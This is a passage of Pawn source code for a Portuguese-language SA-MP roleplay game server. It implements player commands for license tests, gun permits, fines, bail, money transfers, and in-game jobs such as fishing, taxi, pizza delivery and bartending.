			    return 1;
			}

			TestPlayerN = playerid;
			TestPartN = 0;
			SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] O teste irá iniciar em alguns segundos...");
			SetTimer("LicenseTestN", 3000, false);
			return 1;
		}
		
		if(Area[playerid] == AREA_HABA)
		{
		    if(haba == 1)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você já possui habilitação aérea...");
			    return 1;
	        }
	        
		    if(TestPlayerA != INVALID_PLAYER_ID)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Há alguém executando o teste, aguarde...");
			    return 1;
			}

			TestPlayerA = playerid;
			TestPartA = 0;
			SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] O teste irá iniciar em alguns segundos...");
			SetTimer("LicenseTestA", 3000, false);
		    return 1;
		}
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma área para fazer teste de habilitação.");
	    return 1;
	}
	
	if(strcmp(cmd, "/armas", true) == 0)
	{
		new string[2048];
		
		format(string, sizeof string, "{FF0000}ID - Arma - Cartuchos - Munição (por cartucho) - Valor (por cartucho)\r\n{FFFFFF}");
		
		for(new w = 1; w < sizeof Weapons; w++)
		{
		    if(!IsForbiddenWeapon(w))
		    {
				if(Weapons[w][wAmmo] > 0 && Weapons[w][wAmmoLimit] > 0)
		    		format(string, sizeof string, "%s%d - %s - %d cartucho(s) - %d munições(ão) - $%d,00 dólares\r\n", string, w, Weapons[w][wName], Weapons[w][wAmmoLimit] / Weapons[w][wAmmo], Weapons[w][wAmmo], Weapons[w][wValue]);
		    		
				else
				    format(string, sizeof string, "%s%d - %s - sem cartuchos - sem munição - $%d,00 dólares\r\n", string, w, Weapons[w][wName], Weapons[w][wValue]);
			}
		}
		
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{00FF00}Armas", string, "Fechar", "");
		return 1;
	}
	
	if(strcmp(cmd, "/porte", true) == 0)
	{
	    new xpath[128];
	    new lgun;

	    if(GetPlayerInt(playerid) != INT_POLICE_DEPARTMENT)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Delegacia.");
	        return 1;
		}

		xpath = GetPlayerXFilePath(playerid);
		lgun = hGetInt(xpath, "LicenseGun");

		if(lgun > 1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você já possui porte de armas para todas as categorias.");
	        return 1;
		}

		if(lgun > 0)
		{
			if(GetPlayerSysMoney(playerid) < 500)
			{
		    	SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro. Custo: $500,00 dólares.");
	        	return 1;
			}
		}

		else
		{
			if(GetPlayerSysMoney(playerid) < 300)
			{
		    	SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro. Custo: $300,00 dólares.");
	        	return 1;
			}
		}

		LGunPart[playerid] = 0;
		ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas", "Para realizar o teste você deverá responder\ncorretamente as questões e aceitá-las.\n\nAdquirindo seu porte, terá de ficar ciente\ndas regras ou será severamente punido.", "OK", "Cancelar");
 		return 1;
	}
	
	if(strcmp(cmd, "/documentos", true) == 0)
	{
		new xpath[128], tmp[128], string[128];
		new plid, hab, habt, habn, haba, jobid, skin, lgun, fine;

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    plid = playerid;
		}
		
		else
		{
		    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

		    plid = strval(tmp);

		    if(!IsPlayerConnected(plid))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    	return 1;
		    }

		    GetPlayerPos(playerid, X, Y, Z);
		    GetPlayerPos(plid, PX, PY, PZ);

		    if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
		    	return 1;
		    }
		}
		
		xpath = GetPlayerXFilePath(playerid);
		jobid = hGetInt(xpath, "Job");
		skin = hGetInt(xpath, "Skin");
		lgun = hGetInt(xpath, "LicenseGun");
		fine = hGetInt(xpath, "Fine");
	    hab = hGetInt(xpath, "Hab");
	    habt = (hab >> 2) & 0x1;
		habn = (hab >> 1) & 0x1;
		haba = hab & 0x1;

        SendClientMessage(playerid, COLOUR_WHITE, "Documentos mostrados.");
    	format(string, sizeof string, "[----- %s - Documentos -----]", PlayerName(playerid));
    	SendClientMessage(plid, COLOUR_GREEN, string);
    	format(string, sizeof string, "Emprego: %s - Skin: %d", Jobs[jobid][jobName], skin);
    	SendClientMessage(plid, COLOUR_WHITE, string);
    	format(string, sizeof string, "Habilitações -> Terrestre: %s - Naútica: %s - Aérea: %s", (habt == 1) ? ("Sim") : ("Não"), (habn == 1) ? ("Sim") : ("Não"), (haba == 1) ? ("Sim") : ("Não"));
    	SendClientMessage(plid, COLOUR_WHITE, string);
    	format(string, sizeof string, "Porte de Armas -> CAT1 - Armas Leves: %s - CAT2 - Armas Pesadas: %s", (lgun > 0) ? ("Sim") : ("Não"), (lgun > 1) ? ("Sim") : ("Não"));
    	SendClientMessage(plid, COLOUR_WHITE, string);
    	format(string, sizeof string, "Multas avaliadas em: $%d,00 dólares", fine);
    	SendClientMessage(plid, COLOUR_WHITE, string);
	    return 1;
	}

	if(strcmp(cmd, "/vdocumentos", true) == 0)
	{
	    new tmp[128];
		new plid, vehid;

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    plid = playerid;
		}

		else
		{
		    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

		    plid = strval(tmp);

		    if(!IsPlayerConnected(plid))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    	return 1;
		    }

		    GetPlayerPos(playerid, X, Y, Z);
		    GetPlayerPos(plid, PX, PY, PZ);

		    if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
		    	return 1;
		    }
		}

		if(!IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		    return 1;
		}

		vehid = GetPlayerVehicleID(playerid);
		SendClientMessage(playerid, COLOUR_WHITE, "Documentos do veículo mostrados.");
		ShowVehicleDocumentsForPlayer(vehid, plid, playerid);
		return 1;
	}
	
	if(strcmp(cmd, "/pagardividas", true) == 0)
	{
	    new tmp[128], xvpath[128];
	    new option, value;
	    
	    if(GetPlayerInt(playerid) != INT_POLICE_DEPARTMENT)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Delegacia.");
	        return 1;
		}
		
	    tmp = strtok(cmdtext, idx);
	    value = 0;
	    
	    if(strlen(tmp) > 0)
		{
		    if(strcmp(tmp, "pessoal", true) == 0)
		        option = 1;

			if(strcmp(tmp, "veicular", true) == 0)
			    option = 2;
		}

		if(option == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /pagardividas [pessoal/veicular] [placa]");
		    return 1;
		}
		
		if(option == 1)
		    xvpath = GetPlayerXFilePath(playerid);
		
		if(option == 2)
		{
		    new plate[128];
		    new vehid;
		    
		    strmid(plate, cmdtext, idx, strlen(cmdtext));
		    
		    if(!strlen(plate))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "USO: /pagardividas veicular [placa]");
		    	return 1;
		    }
		    
		    vehid = GetPlateVehicleId(plate);
		    
		    if(vehid == INVALID_VEHICLE_ID)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Veículo não encontrado.");
	    		return 1;
		    }
		    
		    if(!IsPlayerVehicle(vehid))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário deste veículo.");
	    		return 1;
		    }
		    
		    xvpath = GetVehicleFilePath(vehid);
		    
		    if(strcmp(PlayerName(playerid), hGetString(xvpath, "Owner"), true) != 0)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário deste veículo.");
	    		return 1;
		    }
		    
		    if(hGetInt(xvpath, "Seized"))
		        value = 1000;
		}
		
		value += hGetInt(xvpath, "Fine");
		
		if(value <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Nenhuma dívida encontrada.");
	    	return 1;
		}

		if(GetPlayerSysMoney(playerid) < value)
		{
		    new errmsg[128];
		    format(errmsg, sizeof errmsg, "Você não possui dinheiro. Valor: $%d,00 dólares.", value);
		    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
		    return 1;
		}
		
		hSetInt(xvpath, "Fine", 0);
		GivePlayerSysMoney(playerid, -value);
		SendClientMessage(playerid, COLOUR_WHITE, "Pagamento das dívidas concluído.");
		
		if(hGetInt(xvpath, "Seized"))
		{
		    hSetInt(xvpath, "Seized", 0);
		    SendClientMessage(playerid, COLOUR_WHITE, "Veículo desapreendido, peça para um policial pegá-lo.");
		}
		
		return 1;
	}
	
	if(strcmp(cmd,"/pagarfianca",true) == 0)
	{
	    new xpath[128], string[128];
	    new busted, bail, bank;
	    
	    xpath = GetPlayerXFilePath(playerid);
	    busted = hGetInt(xpath, "BustedTime");
		bail = hGetInt(xpath, "Bail");
		bank = hGetInt(xpath, "Bank");
		
	    if(busted <= 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está preso.");
	        return 1;
	    }
	    
	    if(bail <= 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não pode pagar fiança.");
	        return 1;
	    }
	    
		if(bank < bail)
		{
		    if(GetPlayerSysMoney(playerid) < bail)
		    {
		    	format(string, sizeof string, "Você não tem o dinheiro da fiança, Custo: $%d,00 dólares.", bail);
		    	SendClientMessage(playerid, COLOUR_GRAY, string);
		    	return 1;
			}

			GivePlayerSysMoney(playerid, -bail);
			SendClientMessage(playerid, COLOUR_WHITE, "Fiança paga, dinheiro retirado da mão.");
		}
		
		else
		{
		    hSetInt(xpath, "Bank", bank - bail);
		    SendClientMessage(playerid, COLOUR_WHITE, "Fiança paga, dinheiro retirado do banco.");
		}
		
		hSetInt(xpath, "BustedStart", 0);
		hSetInt(xpath, "BustedTime", 0);
		SetPlayerInterior(playerid, 6);
  		SetPlayerPos(playerid, 266.7647, 77.7550, 1001.0390);
  		SetPlayerVirtualWorld(playerid, 0);
  		UpdatePlayerSpawn(playerid);
  		DrawTextForPlayer(playerid, "Solto.", COLOUR_RED, TEXTDRAW_STYLE_3, 4000);
		return 1;
	}
	
	if(strcmp(cmd, "/presos", true) == 0)
	{
	    new xpath[128], string[128];
	    new count;
	    
	    count = 1;
	    SendClientMessage(playerid, COLOUR_SWAT, "Lista de Prisioneiros:");
	    
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n))
	        {
				xpath = GetPlayerXFilePath(n);
				
				if(hGetInt(xpath, "BustedTime") > 0)
				{
				    count++;
				    format(string, sizeof string, "Prisioneiro N°%d - %s", count, PlayerName(n));
				    SendClientMessage(playerid, COLOUR_WHITE, string);
				}
	        }
	    }
	    
	    return 1;
	}
	
	if(strcmp(cmd, "/procurados", true) == 0)
	{
        new xpath[128], string[128];
	    new wanted;

	    SendClientMessage(playerid, COLOUR_SWAT, "Lista de Procurados:");

	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n))
	        {
				xpath = GetPlayerXFilePath(n);
				wanted = hGetInt(xpath, "WantedLevel");
				    
				if(wanted > 0)
				{
				    if(wanted > 6)
				    	wanted = 6;
				    
				    format(string, sizeof string, "Nome: %s - Estrelas: %d", PlayerName(n), wanted);
				    SendClientMessage(playerid, COLOUR_WHITE, string);
				}
	        }
	    }

	    return 1;
	}
	
	if(strcmp(cmd, "/transferir", true) == 0)
	{
	    new tmp[128], string[128];
		new plid, value;
		new Float:PX, Float:PY, Float:PZ, Float:X, Float:Y, Float:Z;

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /transferir [id] [valor]");
		    return 1;
		}

		plid = strval(tmp);

		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    return 1;
		}

		GetPlayerPos(playerid, PX, PY, PZ);
		GetPlayerPos(plid, X, Y, Z);

		if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      		return 1;
		}

		value = strval(strtok(cmdtext, idx));

		if(value <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /transferir [id] [valor]");
		    return 1;
		}

		if(GetPlayerSysMoney(playerid) < value)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro.");
      		return 1;
		}

		GivePlayerSysMoney(playerid, -value);
		GivePlayerSysMoney(plid, value);
		SendClientMessage(playerid, COLOUR_WHITE, "Dinheiro transferido.");
		format(string, sizeof string, "%s lhe transferiu $%d,00 dólares.", PlayerName(playerid), value);
		SendClientMessage(plid, COLOUR_WHITE, string);
		return 1;
	}
	if(strcmp(cmd, "/pagar", true) == 0)
	{
		new tmp[128], string[128];
		new plid, value;
		new Float:PX, Float:PY, Float:PZ, Float:X, Float:Y, Float:Z;
		
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /pagar [id] [valor]");
		    return 1;
		}
		
		plid = strval(tmp);
		
		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    return 1;
		}
		
		GetPlayerPos(playerid, PX, PY, PZ);
		GetPlayerPos(plid, X, Y, Z);
		
		if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      		return 1;
		}
		
		value = strval(strtok(cmdtext, idx));
		
		if(value <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /pagar [id] [valor]");
		    return 1;
		}
		
		if(GetPlayerSysMoney(playerid) < value)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro.");
      		return 1;
		}

		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-pagar.");
			return 1;
		}
		
		Pay(plid, value);
		GivePlayerSysMoney(playerid, -value);
		SendClientMessage(playerid, COLOUR_WHITE, "Jogador pago.");
		format(string, sizeof string, "%s lhe pagou $%d,00 dólares.", PlayerName(playerid), value);
		SendClientMessage(plid, COLOUR_WHITE, string);
		reportf("%s pagou $%d,00 dólares à %s", REPORT_PAY, PlayerName(playerid), value, PlayerName(plid));
		return 1;
	}
    
	// Desempregado - Inicio
	
	if(strcmp(cmd, "/coletarlata", true) == 0)
	{
	    new dump;
	    
	    if(CheckpointStatus[playerid] == CHECKPOINT_CANS)
	    {
	        DisablePlayerCheckpoint(playerid);
			CheckpointStatus[playerid] = CHECKPOINT_NONE;
			DrawTextForPlayer(playerid, "Coleta de latas finalizada", COLOUR_UNEMPLOYED, TEXTDRAW_STYLE_2, 2000);
			return 1;
	    }

		dump = random(sizeof Dumps);
		
		DisablePlayerCheckpoint(playerid);
		CheckpointStatus[playerid] = CHECKPOINT_CANS;
		SetPlayerCheckpoint(playerid, Dumps[dump][0], Dumps[dump][1], Dumps[dump][2], 3.0);
		DrawTextForPlayer(playerid, "Coleta de latas iniciada", COLOUR_UNEMPLOYED, TEXTDRAW_STYLE_2, 2000);
	    return 1;
	}
	
	if(strcmp(cmd, "/minhaslatas", true) == 0)
	{
	    new string[128];
	    
	    format(string, sizeof string, "Você possui %d latas.", Collect[playerid]);
	    SendClientMessage(playerid, COLOUR_UNEMPLOYED, string);
        return 1;
	}
	
	if(strcmp(cmd, "/venderlatas", true) == 0)
	{
	    new string[128];
		new value;
		
		if(Company[playerid] != COMPANY_TRASH)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está no Lixão.");
		    return 1;
		}
		
		if(Collect[playerid] == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui latas.");
		    return 1;
		}
		
		value = Collect[playerid] * 5;
		Collect[playerid] = 0;
		GivePlayerSysMoney(playerid, value);
		format(string, sizeof string, "Latas vendidas, você recebeu $%d,00 dólares.", value);
		SendClientMessage(playerid, COLOUR_UNEMPLOYED, string);
        return 1;
	}
	
	// Desempregado - Fim
	
	// Pescador - Inicio

	if(strcmp(cmd, "/pescar", true) == 0)
	{
		new xpath[128];

		xpath = GetPlayerXFilePath(playerid);

		if(Fishing[playerid] == 1)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você já está pescando.");
			return 1;
		}
		
		if(hGetInt(xpath, "Bait") == 0)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você não possui iscas, compre no ícone 'Pescador'.");
			return 1;
		}

		if(Area[playerid] != AREA_FISH)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você não está na área de pesca.");
			return 1;
		}

        if(strcmp(animlib, "SWIM", true) == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em um barco ou no pier para pescar.");
			return 1;
		}
		
        Fishing[playerid] = 1;
        SendClientMessage(playerid, COLOUR_GREEN, "Você lançou a rede de pesca. Espere ela voltar para concluir a pesca.");
		SendClientMessage(playerid, COLOUR_GREEN, "Enquanto ela não vem, fique apreciando a paisagem.");
		SetTimerEx("Fishery", 30000 + random(20001), false, "d", playerid);
		return 1;
	}
	
	if(strcmp(cmd, "/minhasiscas", true) == 0)
	{
		new xpath[128], string[128];

		xpath = GetPlayerXFilePath(playerid);
	
		if(hGetInt(xpath, "Bait") <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui nenhuma isca para pescar.");
		    return 1;
		}

		format(string, sizeof string, "Você possui %d iscas para pescar.", hGetInt(xpath,"Bait"));
  		SendClientMessage(playerid, COLOUR_FISHER, string);
	  	return 1;
	}
	
	if(strcmp(cmd, "/venderpesca", true) == 0)
	{
		new xpath[128], string[128];
		new fish;
		
		xpath = GetPlayerXFilePath(playerid);
	
		if(GetPlayerInt(playerid) != INT_RESTAURANT)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um restaurante.");
		    return 1;
		}

		if(hGetInt(xpath, "Fish") <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem nenhuma pesca para vender.");
		    return 1;
		}

		fish = hGetInt(xpath,"Fish");
		hSetInt(xpath, "Fish", 0);
		Pay(playerid, fish);
		format(string, sizeof string, "Pescado vendido, você recebeu $%d,00 dólares.", fish);
		SendClientMessage(playerid, COLOUR_FISHER, string);
		return 1;
	}

	if(strcmp(cmd, "/pegariscas", true) == 0)
	{
		new xpath[128], string[128];
		new amount, bait;
		
		xpath = GetPlayerXFilePath(playerid);
		amount = strval(strtok(cmdtext, idx));
		bait = hGetInt(xpath,"Bait");
		
		if(bait >= 20)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você já possui o máximo de iscas.");
			return 1;
		}
		
		if(amount < 1 || amount > 20)
		{
	   		SendClientMessage(playerid, COLOUR_GRAY, "USO: /pegariscas [quantidade] - Quantidade de 1 à 20.");
  			return 1;
		}
		
		if(Company[playerid] != COMPANY_FISH)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Cooperativa de Pesca.");
			return 1;
		}
		
		if(amount + bait > 20)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você só pode levar 20 iscas no máximo.");
			return 1;
		}

        hSetInt(xpath, "Bait", amount + bait);
		format(string, sizeof string, "Iscas adquiridas, agora você possui %d iscas.", amount + bait);
		SendClientMessage(playerid, COLOUR_FISHER, string);
  		return 1;
	}
	
	// Pescador - Fim
	
	// Taxista - Inicio
	
	if(strcmp(cmd, "/entregas", true) == 0)
	{
		if(!IsPlayerInJobVehicle(playerid, TAXI))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um taxi da companhia.");
       		return 1;
		}
		
	    if(TaxiDelivery[playerid] != -1)
	    {
	        TaxiDelivery[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        DrawTextForPlayer(playerid, "Entregas automáticas canceladas", COLOUR_CABBIE, TEXTDRAW_STYLE_2, 2000);
	        return 1;
	    }
	    
	    if(Taximeter[playerid] != -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Seu taxímetro deve estar desligado para fazer as entregas automáticas.");
			return 1;
		}
	    
		if(TaxiDelivery[playerid] <= 0)
		{
		    TaxiDelivery[playerid] = 0;
		    SetPlayerRaceCheckpoint(playerid, 1, 1743.1726, -1856.5837, 13.4140, 0.0, 0.0, 0.0, 4.0);
		    SendClientMessage(playerid, COLOUR_CABBIE, "Vá buscar as encomendas na Companhia de Taxi.");
		}
		
		else
		{
		    new place;
		    
		    place = random(sizeof TaxiPlaces);
		    
		    SetPlayerRaceCheckpoint(playerid, 1, TaxiPlaces[place][0], TaxiPlaces[place][1], TaxiPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
		    SendClientMessage(playerid, COLOUR_CABBIE, "Entregue o próximo pacote.");
		}
		
		DrawTextForPlayer(playerid, "Entregas automáticas iniciadas", COLOUR_CABBIE, TEXTDRAW_STYLE_2, 2000);
	    return 1;
	}
	
	// Taxista - Fim
	
	// Pizzaboy - Inicio
	
	if(strcmp(cmd, "/abastecermobilete", true) == 0)
	{
		new bike;
		
		if(Company[playerid] != COMPANY_PIZZA)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Pizzaria.");
       		return 1;
		}
		
	    bike = GetPlayerJobVehicle(playerid, SCOOTER);

		if(bike == -1)
        {
        	SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma Mobilete.");
       		return 1;
	    }
	    
	    if(BikePizzas[bike] >= 3)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Mobilete cheia.");
       		return 1;
	    }
	    
	    BikePizzas[bike] = 3;
	    SendClientMessage(playerid, COLOUR_PIZZABOY, "Mobilete abastecida com 3 pizzas.");
	    return 1;
	}
	
	if(strcmp(cmd, "/pizza", true) == 0)
	{
	    new pizza_cmd[128];
	    
		pizza_cmd = strtok(cmdtext, idx);
		
		if(strlen(pizza_cmd) > 0)
		{
		    if(strcmp(pizza_cmd, "vender", true) == 0)
		    {
		        new tmp[128], string[128];
		        new plid, bike;
				new Float:VX, Float:VY, Float:VZ, Float:PX, Float:PY, Float:PZ;
		        
		        tmp = strtok(cmdtext, idx);
		        
		        if(!strlen(tmp))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "USO: /pizza vender [id]");
		            return 1;
		        }
		        
		        bike = GetPlayerJobVehicle(playerid, SCOOTER);
		        
		        if(bike == -1)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma Mobilete.");
		            return 1;
		        }
		        
		        plid = strval(tmp);
		        
		        if(!IsPlayerConnected(plid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		            return 1;
		        }
		        
		        GetVehiclePos(SCOOTER[bike], VX, VY, VZ);
		        GetPlayerPos(plid, PX, PY, PZ);
		        
		        if(GetDistance(VX, VY, VZ, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
		            return 1;
		        }
		        
		        if(BikePizzas[bike] <= 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Mobilete vazia.");
		            return 1;
		        }
		        
		        if(plid == playerid)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender pizzas para si mesmo.");
					return 1;
				}
		
		        BikePizzas[bike]--;
				AddPlayerSysHealth(plid, 10.0);
		        SendClientMessage(playerid, COLOUR_PIZZABOY, "Pizza vendida, peça para o jogador usar /pagar");
		        format(string, sizeof string, "%s lhe vendeu uma pizza, para pagá-lo use /pagar.", PlayerName(playerid));
				SendClientMessage(plid, COLOUR_WHITE, string);
		        format(string, sizeof string, "Pizzas na Mobilete: %d", BikePizzas[bike]);
                DrawTextForPlayer(playerid, string, COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 2000);
		        return 1;
		    }
		    
		    if(strcmp(pizza_cmd, "entregas", true) == 0)
		    {
				DisablePlayerRaceCheckpoint(playerid);
                RemovePlayerAttachedObject(playerid, OBJECT_SLOT_CARRY);
                
		        if(PizzaDelivery[playerid] == 0)
		        {
                    PizzaDelivery[playerid] = 1;
                    SetPlayerRaceCheckpoint(playerid, 1, 2098.5437, -1806.6945, 13.5546, 0.0, 0.0, 0.0, 4.0);
		            DrawTextForPlayer(playerid, "Entregas automáticas iniciadas", COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 2000);
		            return 1;
		        }
		        
		        else
		        {
		            PizzaDelivery[playerid] = 0;
		            DrawTextForPlayer(playerid, "Entregas automáticas desativadas", COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 2000);
		            return 1;
		        }
		    }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /pizza [comando] - COMANDOS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "vender, entregas");
		return 1;
	}
	
	// Pizzaboy - Fim
	
	// Barman - Inicio

    if(strcmp(cmd, "/bebida", true) == 0)
	{
	    new tmp[128], drink[128], string[128];
	    new plid, action;
	    new Float:PX, Float:PY, Float:PZ, Float:X, Float:Y, Float:Z;
	    
	    tmp = strtok(cmdtext, idx);
	    
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /bebida [id] [bebida]");
		    return 1;
	    }
	    
	    plid = strval(tmp);
	    
	    if(!IsPlayerConnected(plid))
     	{
          	SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
          	return 1;
     	}
		        
        GetPlayerPos(playerid, PX, PY, PZ);
		GetPlayerPos(plid, X, Y, Z);

		if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      		return 1;
		}
		
		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender uma bebida para si mesmo.");
	        return 1;
		}
		
		action = GetPlayerSpecialAction(plid);
		
		if(action == SPECIAL_ACTION_DRINK_SPRUNK || action == SPECIAL_ACTION_DRINK_BEER || action == SPECIAL_ACTION_DRINK_WINE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já está bebendo algo.");
          	return 1;
		}
		
	    action = -1;
	    drink = strtok(cmdtext, idx);
	    
	    if(strlen(drink) > 0)
	    {
	        if(strcmp(drink, "Refrigerante", true) == 0)
	        {
				action = SPECIAL_ACTION_DRINK_SPRUNK;
				format(string, sizeof string, "%s lhe vendeu um refrigerante, use /pagar", PlayerName(playerid));
			}
			
	        if(strcmp(drink, "Cerveja", true) == 0)
	        {
				action = SPECIAL_ACTION_DRINK_BEER;
                format(string, sizeof string, "%s lhe vendeu uma cerveja, use /pagar", PlayerName(playerid));
			}
			
            if(strcmp(drink, "Whisky", true) == 0)
            {
				action = SPECIAL_ACTION_DRINK_WINE;
				format(string, sizeof string, "%s lhe vendeu um whisky, use /pagar", PlayerName(playerid));
			}
			
			if(action != -1)
			{
			    DrinkSips[plid] = 10;
			    SetPlayerSpecialAction(plid, action);
			    SendClientMessage(playerid, COLOUR_BARMAN, "Bebida vendida, peça para o jogador usar /pagar");
			    SendClientMessage(plid, COLOUR_WHITE, string);
			    format(string, sizeof string, "Para beber pressione ~y~%s", GetKeyName(K_DRINK, 1));
		    	DrawTextForPlayer(plid, string, COLOUR_WHITE, TEXTDRAW_STYLE_2, 3000);
			    return 1;
			}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /bebida [id] [bebida] - BEBIDAS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "Refrigerante, Cerveja, Whisky");
	    return 1;
	}

	if(strcmp(cmd, "/entregarbebidas", true) == 0)
	{
	    new enter, place, world;
	    
	    enter = Enter[playerid];
	    place = -1;
	    world = 0;
	    
	    if(enter != -1)
	    {
	    	if(Enters[enter][intId] == INT_DISCO)
	    	    place = 0;
	    
	    	if(Enters[enter][intId] == INT_STRIP_CLUB)
				place = 1;
	    
	    	if(Enters[enter][intId] == INT_RESTAURANT)
				place = 2;
	    
	    	if(Enters[enter][intId] == INT_BAR)
				place = 3;
				
			if(Enters[enter][enterVirtualWorld] != 0)
				world = Enters[enter][enterVirtualWorld] - 1;
	    }
	    
	    if(place == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma discoteca, boate, restaurante ou bar.");
	        return 1;
	    }
	    
		if((DrinkSupply[place] >> world) & 0x1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este local já está abastecido.");
	        return 1;
		}
		
		Supplies[playerid]++;
		DrinkSupply[place] |= 1 << world;
		GivePlayerSysMoney(playerid, 25);
		SendClientMessage(playerid, COLOUR_BARMAN, "Local abastecido, você recebeu $25,00 dólares.");
		
		if(Supplies[playerid] >= 10)
		{
		    Supplies[playerid] = 0;
		    Pay(playerid, 200);
		    SendClientMessage(playerid, COLOUR_BARMAN, "Você completou 10 abastecimentos e recebeu $200,00 dólares.");
